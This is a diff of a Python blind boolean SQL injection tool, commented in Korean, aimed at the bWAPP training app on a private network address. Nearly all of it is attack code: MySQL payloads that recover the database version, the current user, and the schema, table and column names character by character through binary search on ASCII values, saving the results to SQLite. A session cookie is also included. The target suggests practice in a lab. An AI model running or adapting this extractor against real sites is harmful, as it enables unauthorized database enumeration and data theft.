@@ -1,14 +1,11 @@
-####################
 # 
+####################
 # 1. --basic 선택 시 에러 해결 -> 완료
 # 2. POST 문제 해결
 # 3. 다른 데이터베이스 페이로드 생성
 # 4. 데이터 출력 구현,  조회해서 나온 값을 (테이블 생성하고 각 컬럼들 값들을 SQLite에 그대로 저장)
 # 
 ###############
-
-
-
 
 # -*- coding: utf-8 -*-   
 from time import sleep
@@ -18,53 +15,29 @@ import requests
 import warnings
 import argparse
 import sqlite3
-
 warnings.filterwarnings('ignore')
 
-
-
+# 전역변수
 output_check = False
 args = None
 true_message_size = None # 참(ture)의 경우 message size
 
 
 REQUEST_STRING = """
-GET /bWAPP/sqli_1.php?title=Iron%'+and+1=1+--+&action=search HTTP/1.1
+GET /bWAPP/sqli_1.php?title=Iron%25'+and+1=1+--+&action=search HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
 Accept-Encoding: gzip, deflate, br
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Connection: keep-alive
-Host: 192.168.219.100:8080
+Host: 192.168.0.32:8080
 Accept-Language: ko-KR,ko;q=0.9
 Upgrade-Insecure-Requests: 1
 Referer: http://192.168.219.100:8080/bWAPP/sqli_1.php
-Cookie: PHPSESSID=d1dc9eaac34466eb26f124b19f9e41fa; security_level=0
+Cookie: security_level=0; PHPSESSID=4744626a3ee715b12c0ef1226d811fdf
 
 
 """
 
-# def get_argument():
-# 	parser = argparse.ArgumentParser()
-# 	parser.add_argument("-s",dest="schema", help="http? https?")
-# 	parser.add_argument("-p", dest="parameter", help="target param")
-# 	parser.add_argument("-d", dest="result_db", help="Database name for storing results ex) -d result_db.db")
-
-# 	parser.add_argument("-D", dest="select_db", help="select DB")
-# 	parser.add_argument("-T", dest="select_table", help="select Table")
-# 	parser.add_argument("-C", dest="select_column", help="select Column")
-# 	# parser.add_argument("-C", type=str, help="select Table")
-
-# 	parser.add_argument("--proxy", dest="proxy", help="Use a proxy to connect to the target URL")
-# 	parser.add_argument("--dbms", dest="dbms", help="SELECT DBMS : MySQL, Oracle, MSSQL, PostgreSQL")
-# 	parser.add_argument("--basic", action="store_true", help="Basic info extraction")
-# 	parser.add_argument("--dbs", action="store_true", help="Enumerate DBMS databases")
-# 	parser.add_argument("--tables", action="store_true", help="Enumerate Tables")
-# 	parser.add_argument("--columns", action="store_true", help="Enumerate columns")
-
-# 	options = parser.parse_args()
-# 	if not options.parameter or not options.schema:
-# 		parser.error("[-] Missing required parameters: --param, --schema are required. Use --help for more info.")
-# 	return options
 class Colors:
 	""" ANSI color codes """
 	BLACK = "\033[0;30m"
@@ -139,16 +112,21 @@ class SQLiteProcessor:
 		cursor = conn.cursor()
 
 		# 기본 테이블 생성 (DB, Table, Column)
-		cursor.execute('CREATE TABLE IF NOT EXISTS basic_info (id INTEGER PRIMARY KEY AUTOINCREMENT, version VARCHAR(255), UNIQUE(Version))')
+		cursor.execute('CREATE TABLE IF NOT EXISTS basic_info (id INTEGER PRIMARY KEY AUTOINCREMENT, version VARCHAR(255), user VARCHAR(255), UNIQUE(Version, user))')
 		cursor.execute('CREATE TABLE IF NOT EXISTS dbs_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255), UNIQUE(db_name))')
 		cursor.execute('CREATE TABLE IF NOT EXISTS table_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255), table_name VARCHAR(255), UNIQUE(db_name, table_name))')
 		cursor.execute('CREATE TABLE IF NOT EXISTS column_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255), table_name VARCHAR(255), column_name VARCHAR(255), UNIQUE(db_name, table_name, column_name))')
 	# def result_table_create():
 		
-	def result_set_name(insert_db_data, select_table_one=None): # 중복코드 추후 수정
+	def result_set_name(insert_db_data, select_table_one=None, field=None): # 중복코드 추후 수정
 		if args.basic:
-			cursor.execute("INSERT OR IGNORE INTO basic_info (version) VALUES (?)", (insert_db_data,))
-			conn.commit()			
+
+			if field == 'Version':
+				cursor.execute("INSERT OR IGNORE INTO basic_info (version) VALUES (?)", (insert_db_data,))
+			elif field == 'User':
+				cursor.execute("UPDATE basic_info SET user = ? WHERE id = ?", (insert_db_data, 1))
+			cursor.execute("DELETE FROM basic_info WHERE id != 1;")
+			conn.commit()
 		elif args.dbs:
 			cursor.execute("INSERT OR IGNORE INTO dbs_info (db_name) VALUES (?)", (insert_db_data,))
 			conn.commit()
@@ -206,8 +184,10 @@ def parse_request(request):
 def payload_set(condition, payloads):
 	result_payload = {}
 	for key, value in payloads.items():
-		payload_tmp = condition.replace('1=1', value)
-		result_payload[key] = payload_tmp
+		result_payload[key] = {} # 중첩 딕셔너리 초기화
+		for key2, value2 in value.items():
+			payload_tmp = condition.replace('1=1', value2)
+			result_payload[key][key2] = payload_tmp
 
 	return result_payload
 
@@ -234,30 +214,43 @@ def setpayload():
 		if args.basic:
 			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL 기본 정보 출력 Start{Colors.END}\n")
 			payloads = {
-				'count': "SELECT count(*) FROM @@version",
-				'len': "(SELECT length((SELECT @@version)))>{mid_val}",
-				'version' : "ascii(substr((SELECT @@version),{substr_index},1))>{mid_val}",
+				'Version': {
+					'count': "",
+					'len': "(SELECT length((SELECT @@version)))>{mid_val}",
+					'version': "ascii(substr((SELECT @@version),{substr_index},1))>{mid_val}"
+				},
+				'User': {
+					'count': "",
+					'len': "(SELECT length((SELECT user())))>{mid_val}",
+					'version': "ascii(substr((SELECT user()),{substr_index},1))>{mid_val}"
+				},
 			}
 		if args.dbs:
 			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL DB 출력 Start{Colors.END}\n")
 			payloads = {
-				'count' : "(SELECT count(*) FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema'))>{mid_val}",
-				'len' : "(SELECT length((SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema') LIMIT {rows},1)))>{mid_val}",
-				'dbs' : "ascii(substr((SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema') LIMIT {rows},1),{substr_index},1))>{mid_val}"
+				'Dbs': {
+					'count' : "(SELECT count(*) FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema'))>{mid_val}",
+					'len' : "(SELECT length((SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema') LIMIT {rows},1)))>{mid_val}",
+					'dbs' : "ascii(substr((SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema') LIMIT {rows},1),{substr_index},1))>{mid_val}"
+				}
 			}
 		if args.tables:
 			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL 테이블 출력 Start{Colors.END}\n")
 			payloads = {
-				'count' : "(SELECT count(*) FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}'))>{mid_val}",
-				'len' : "(SELECT length((SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') LIMIT {rows},1)))>{mid_val}",
-				'tables' : "ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') LIMIT {rows},1),{substr_index},1))>{mid_val}"
+				'Tables': {
+					'count' : "(SELECT count(*) FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}'))>{mid_val}",
+					'len' : "(SELECT length((SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') LIMIT {rows},1)))>{mid_val}",
+					'tables' : "ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') LIMIT {rows},1),{substr_index},1))>{mid_val}"
+				}
 			}
 		if args.columns:
 			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL 컬럼 출력 Start{Colors.END}\n")
 			payloads = {
-				'count' : "(SELECT count(*) FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}'))>{mid_val}",
-				'len' : "(SELECT length((SELECT column_name FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}') LIMIT {rows},1)))>{mid_val}",
-				'columns' : "ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}') LIMIT {rows},1),{substr_index},1))>{mid_val}"
+				'Columns': {
+					'count' : "(SELECT count(*) FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}'))>{mid_val}",
+					'len' : "(SELECT length((SELECT column_name FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}') LIMIT {rows},1)))>{mid_val}",
+					'columns' : "ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}') LIMIT {rows},1),{substr_index},1))>{mid_val}"
+				}
 			}
 		# else:
 		# 	print("Use --help for more info. (mysql)")
@@ -324,7 +317,7 @@ def connection(data, method, url, path, headers):
 	data[args.parameter] = url_decode(data[args.parameter])
 	data[args.parameter] = url_encode(data[args.parameter])
 	params = '&'.join([f"{key}={value}" for key, value in data.items()])      
-	# print(params)
+	# print(params) # 요청전 최종 페이로드 확인
 	proxies = {'http': args.proxy, 'https': args.proxy}
 	timeout = 30
 	if method == 'GET':
@@ -339,25 +332,23 @@ def connection(data, method, url, path, headers):
 	return 0    # false
 
 def query_start():
-	payloads = setpayload() # 인수에 따른 페이로드 셋팅
-	data, condition = parse_request(REQUEST_STRING) # 응답데이터 파싱
-	check_condition(**data) # True 응답 길이 저장 (참거짓 구분 용도)
-	result_payload = payload_set(condition, payloads) # 조건식에서 1=1 을 페이로드로 리플레이스
-
-	# name_str = "" # 한문자 씩 찾아서 저장할 변수
-	# name_tmp = [] #  name_str 에 저장된 변수를 append 할 배열변수
-
-
 	row_count = 1 # 행 개수
-	# row_data = [] # 행 배열
-	# col_count = 1 # 열 개수
-	# col_data = [] # 열 배열
+	name_tmp = []
 	result_tmp = []
 	result_data = {}
 	data_len  = 0
 	dic = {} # name_str_list 2차원 배열을 엑셀에 넣기위해 딕셔너리형으로 변환 해서 넣을 변수
 	select_tables = [None] # --dbs, --tables 를 실행할때는 None으로 설정
 
+	payloads = setpayload() # 인수에 따른 페이로드 셋팅
+	data, condition = parse_request(REQUEST_STRING) # 응답데이터 파싱
+	check_condition(**data) # True 응답 길이 저장 (참거짓 구분 용도) 	
+	result_payload = payload_set(condition, payloads) # 조건식에서 1=1 을 페이로드로 리플레이스
+	# for key, value in payloads.items():
+	# 	payload_tmp = condition.replace('1=1', value) # 조건식에서 1=1 을 페이로드로 리플레이스
+	# 	result_payload[key] = payload_tmp
+
+	# test = list(payloads.keys())[1]
 
 	if args.select_table != None: # 테이블의 컬럼을 여러개 선택하는 경우 ex) -C blog, movies
 		select_tables = [] # --Columns의 경우 None 값 초기화
@@ -367,42 +358,49 @@ def query_start():
 			select_tables.append(tmp2)
 
 	for select_table_one in select_tables:
-		row_count = recursive(0, 127, data, result_payload['count'],None, None, args.select_db, select_table_one, None)
-
-		if select_table_one:
-			print(f"{Colors.LIGHT_BLUE}[*] '{select_table_one}' 레코드 수 : {str(row_count)}{Colors.END}")
+		if not args.basic:
+			for key, value in result_payload.items():
+				row_count = recursive(0, 127, data, result_payload[key]['count'],None, None, args.select_db, select_table_one, None)
 		else:
-			print(f"{Colors.LIGHT_BLUE}[*] 레코드 수 : {str(row_count)}{Colors.END}")
+			row_count = 1
+		print(f"{Colors.LIGHT_BLUE}[*] '{select_table_one}' 레코드 수 : {str(row_count)}{Colors.END}" if select_table_one else f"{Colors.LIGHT_BLUE}[*] 레코드 수 : {str(row_count)}{Colors.END}")
 
 		for rows in range(0, row_count, 1):  # 레코드 갯수 만큼 반복  # range(row_count)로 해도됨
-			for key, value in list(result_payload.items())[1:]: #딕셔너리를 리스트로 변환 후 첫번째 값(count)는 제외하고 실행 
-				if key == 'len':
-					data_len  = recursive(0, 127, data, value, None, rows, args.select_db, select_table_one, None)
-					# print(f"{select_table_one} 데이터 길이 : " + str(data_len))
-				else:
-					name_str = ""
-					for substr_index in range(0, data_len, 1): # 데이터 글자 수 만큼 반복
-						name_str += chr(recursive(0, 127, data, value, substr_index+1, rows, args.select_db, select_table_one, None))
-						# print(name_str)
-					SQLiteProcessor.result_set_name(name_str, select_table_one) # SQLite에 데이터 저장
-					result_tmp.append(name_str)
-					print(result_tmp)
-						
-			# table_name =		
-		result_data[select_table_one] = result_tmp
-		if select_table_one: #
-			print(f"{Colors.LIGHT_BLUE}[*] '{select_table_one}' 데이터 : {result_data[select_table_one]}{Colors.END}")
+			for key, value in result_payload.items():
+				name_tmp.append(key)
+				for key2, value2 in list(value.items())[1:]: #딕셔너리를 리스트로 변환 후 첫번째 값(count)는 제외하고 실행 
+					if key2 == 'len':
+						data_len  = recursive(0, 127, data, value2, None, rows, args.select_db, select_table_one, None)
+						# print(f"{select_table_one} 데이터 길이 : " + str(data_len))
+					else:
+						name_str = ""
+						for substr_index in range(0, data_len, 1): # 데이터 글자 수 만큼 반복
+							name_str += chr(recursive(0, 127, data, value2, substr_index+1, rows, args.select_db, select_table_one, None))
+							# print(name_str)
+						SQLiteProcessor.result_set_name(name_str, select_table_one, key) # SQLite에 데이터 저장
+						result_tmp.append(name_str)
+						print(result_tmp)
+
+			
+		if args.basic :
+			num = 0
+			for name in name_tmp:
+				result_data[name] = result_tmp[num]
+				num = num + 1
+				print(f"{Colors.LIGHT_BLUE}[*] 데이터 : {result_data}{Colors.END}")
 		else:
-			print(f"{Colors.LIGHT_BLUE}[*] 데이터 : {result_data[select_table_one]}{Colors.END}")
+			if select_table_one:
+				result_data[select_table_one] = result_tmp
+			else:
+				result_data[list(name_tmp)[0]] = result_tmp
+			print(f"{Colors.LIGHT_BLUE}[*] '{select_table_one}' 데이터 : {result_data[select_table_one]}{Colors.END}" if select_table_one else f"{Colors.LIGHT_BLUE}[*] '{list(name_tmp)[0]}' 데이터 : {result_data[list(name_tmp)[0]]}{Colors.END}")
+		# print(f"{Colors.LIGHT_BLUE}[*] 데이터 : {result_data}{Colors.END}")	
 		result_tmp = [] # 레코드 모두 추출 후 초기화
 
 	print(f"{Colors.LIGHT_RED}[*] SQLite 저장 완료{Colors.END}")
 	print(f"\n{Colors.LIGHT_RED}{Colors.BOLD}{Colors.UNDERLINE}[*] 최종 결과{Colors.END}")
 	for key, value in result_data.items(): 
-		if key:
-			print(f"{Colors.LIGHT_BLUE}{key}{Colors.END} : {Colors.GREEN}{value}{Colors.END}")
-		else:
-			print(f"{Colors.LIGHT_BLUE}{Colors.END}{Colors.GREEN}{value}{Colors.END}")
+		print(f"{Colors.LIGHT_BLUE}{key}{Colors.END} : {Colors.GREEN}{value}{Colors.END}")
 	print("\n")	
 		
 if __name__ == '__main__':
